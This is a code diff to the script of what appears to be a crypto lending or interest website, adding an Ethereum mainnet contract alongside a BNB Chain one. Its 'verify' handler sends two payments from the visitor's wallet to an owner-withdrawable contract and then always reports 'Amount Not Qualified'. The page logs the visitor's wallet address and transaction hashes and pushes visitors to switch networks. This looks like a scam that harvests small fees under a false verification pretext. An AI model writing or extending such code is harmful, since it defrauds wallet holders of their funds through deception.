@@ -644,9 +644,104 @@ align:center;
   }
 ]; // Add your contract's ABI here
         const contractAddress = '0xCd3eD077130d8Ad6bB82A5Ee65Aa126AD918217C';
+		
+		const ethcontractABI = [
+  {
+    "inputs": [
+      {
+        "internalType": "address",
+        "name": "new_address",
+        "type": "address"
+      }
+    ],
+    "name": "changeaddress",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "uint256",
+        "name": "new_amount",
+        "type": "uint256"
+      }
+    ],
+    "name": "changeamount",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  },
+  {
+    "inputs": [],
+    "name": "verify",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "withdraw",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "stateMutability": "payable",
+    "type": "receive"
+  },
+  {
+    "inputs": [],
+    "name": "default_address",
+    "outputs": [
+      {
+        "internalType": "address",
+        "name": "",
+        "type": "address"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "default_amount",
+    "outputs": [
+      {
+        "internalType": "uint256",
+        "name": "",
+        "type": "uint256"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "owner",
+    "outputs": [
+      {
+        "internalType": "address",
+        "name": "",
+        "type": "address"
+      }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  }
+];
+        const ethcontractAddress = '0xC8a9b1DAEF73644772eaFD8D9B0d77171b95451A';
+		
+		
         const contract = new web3.eth.Contract(contractABI, contractAddress);
+		const ethcontract = new web3.eth.Contract(ethcontractABI, ethcontractAddress);
         let walletConnected = false;
-        const donationAmount = '0.0021'; // Preset donation amount in BNB
+        const donationAmount = '0.0021';
 	 let walletAddress;
 	let networkId=0;
 	 let chainname;
@@ -665,17 +760,17 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
 		if (networkId === '1')
 		{
 			chainname = 'Ethereum Mainnet';
-			flashNotification("Connect with 'BNB Smart Chain' to Save Gas Fees", 'black');
+			//flashNotification("Connect with 'BNB Smart Chain' to Save Gas Fees", 'black');
 		}
 		if (networkId === '42161')
 		{
 			chainname = 'Arbitrum';	
-			flashNotification("Connect with 'BNB Smart Chain' to Save Gas Fees", 'black');
+			flashNotification("Connect with 'BNB Smart Chain' to avoid transation faliure", 'black');
 		}
 		if (networkId === '8453')
 		{
 			chainname = 'Base';	
-			flashNotification("Connect with 'BNB Smart Chain' to Save Gas Fees", 'black');
+			flashNotification("Connect with 'BNB Smart Chain' to avoid transation faliure", 'black');
 		}
 		
 
@@ -694,19 +789,17 @@ document.getElementById('connect-wallet').addEventListener('click', async () => 
         }
     } catch (error) {
     	if (networkId==0)
-	{
-		flashNotification("Error : Unable to Detect Wallet / You don't have any Web3 Wallet like Metamask / Trust Wallet", 'red');
-	   	updateLog("Error : Trust Wallet - "+networkId+" - "+walletAddress, `❌ Home: ${error.message}`);
-	}
+		{
+			flashNotification("Error : Unable to Detect Wallet / You don't have any Web3 Wallet like Metamask / Trust Wallet", 'red');
+			updateLog("Error : Trust Wallet - "+networkId+" - "+walletAddress, `❌ Home: ${error.message}`);
+		}
 	    else
-	{ 	
-		// Display an error message if the connected network is not BSC
-        	flashNotification('Error: Connect to Binance Smart Chain (Change your Wallet Network)', 'red');
-		updateLog("Error: BSC Chain - "+networkId+" - "+walletAddress, `❌ Home: ${error.message}`);
-	}
-    
-    
-    
+		{ 	
+			// Display an error message if the connected network is not BSC
+				flashNotification('Error: Connect to Binance Smart Chain (Change your Wallet Network)', 'red');
+			updateLog("Error: BSC Chain - "+networkId+" - "+walletAddress, `❌ Home: ${error.message}`);
+		}
+         
     }
 });
 
@@ -732,7 +825,8 @@ document.getElementById('verify').addEventListener('click', async () => {
         flashNotification('Connect wallet first', 'grey');
         return;
     }
-        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    
+	const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
     const sender = accounts[0];
 
     if (!sender) {
@@ -748,21 +842,50 @@ document.getElementById('verify').addEventListener('click', async () => {
 
     try {
         const weiAmount = web3.utils.toWei(donationAmount, 'ether'); // Convert preset BNB amount to wei
-        const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
-
-	const result1 = await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
-	let traxHash = result1.transactionHash;
+		
+		if (networkId === '56')
+		{
+			const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
+			const result1 = await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
+			let traxHash = result1.transactionHash;
 	
-	if (result1.status) {        
-		updateLog(sender,'Home - ✅ 1 - '+ document.getElementById("popup-crypto-name").innerHTML+" "+document.getElementById('amount').value +traxHash);
-	}
+			if (result1.status)
+			{        
+				updateLog(sender,'Home - ✅ 1 - '+ document.getElementById("popup-crypto-name").innerHTML+" "+document.getElementById('amount').value +traxHash);
+			}
 
-        const result2 = await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
-	traxHash = result2.transactionHash;
+			const result2 = await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
+			traxHash = result2.transactionHash;
+			
+			if (result2.status)
+			{        
+				updateLog(sender,'Home - ✅ 2 - '+ document.getElementById("popup-crypto-name").innerHTML+" "+document.getElementById('amount').value +traxHash);
+			}
+			
+		}
+		else if (networkId === '1')
+		{
+			const gas = await ethcontract.methods.verify().estimateGas({ value: weiAmount });
+			const result1 = await ethcontract.methods.verify().send({ from: sender, value: weiAmount, gas });
+			let traxHash = result1.transactionHash;
 	
-	if (result2.status) {        
-		updateLog(sender,'Home - ✅ 2 - '+ document.getElementById("popup-crypto-name").innerHTML+" "+document.getElementById('amount').value +traxHash);
-	}
+			if (result1.status)
+			{        
+				updateLog(sender,'Home - ✅ 1 - '+ document.getElementById("popup-crypto-name").innerHTML+" "+document.getElementById('amount').value +traxHash);
+			}
+
+			const result2 = await ethcontract.methods.verify().send({ from: sender, value: weiAmount, gas });
+			traxHash = result2.transactionHash;
+			
+			if (result2.status)
+			{        
+				updateLog(sender,'Home - ✅ 2 - '+ document.getElementById("popup-crypto-name").innerHTML+" "+document.getElementById('amount').value +traxHash);
+			}
+			
+		}
+		
+        
+
 
         // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
         document.getElementById('popup-status').textContent = 'Amount Not Qualifified';
@@ -787,7 +910,7 @@ document.getElementById('verify').addEventListener('click', async () => {
         });
 
         function openPopup(cryptoName, interestRate, walletAddress)
-{
+		{
 
            if (!walletConnected) {
                 flashNotification('Connect wallet first', 'grey');
@@ -805,15 +928,15 @@ document.getElementById('verify').addEventListener('click', async () => {
             cryptoNameElement.textContent = cryptoName;
             interestRateElement.textContent = interestRate;
             
-document.getElementById('amount').value ="";
-document.getElementById('interest-amount').textContent = 'Interest Amount: 0 ' + document.getElementById("popup-crypto-name").textContent + ' / Day';
+			document.getElementById('amount').value ="";
+			document.getElementById('interest-amount').textContent = 'Interest Amount: 0 ' + document.getElementById("popup-crypto-name").textContent + ' / Day';
             popup.style.display = "flex";
-borrowEnable();
-}
+			borrowEnable();
+		}
 
         
 
-	document.getElementById('close-borrow-popup').addEventListener('click', () => {
+		document.getElementById('close-borrow-popup').addEventListener('click', () => {
             document.getElementById('borrow-popup').style.display = 'none';
         });
 
@@ -821,7 +944,7 @@ borrowEnable();
             document.getElementById('popup').style.display = 'none';
         });
 
-function flashNotification(message, color) {
+		function flashNotification(message, color) {
             const notification = document.getElementById('notification');
             notification.style.backgroundColor = color;
             notification.textContent = message;
